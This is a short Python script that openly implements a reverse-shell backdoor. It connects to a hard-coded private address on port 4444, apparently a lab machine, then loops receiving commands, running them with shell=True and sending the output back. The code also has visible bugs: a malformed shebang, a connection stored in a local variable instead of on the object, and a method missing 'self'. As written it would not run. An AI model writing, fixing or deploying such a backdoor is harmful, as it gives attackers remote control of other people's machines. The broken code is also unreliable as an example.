#!usr/bin/env python3

import socket
import subprocess


class Backdoor:
    def __init__(self, ip, port):
        connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def execute_system_command(command):
        return subprocess.check_output(command, shell=True)

    def run(self):
        while True:
            command = self.connection.recv(1024)
            command_result = self.execute_system_command(command)
            self.connection.send(command_result)
        self.connection.close()


my_backdoor = Backdoor("10.0.2.4", 4444)
my_backdoor.run()
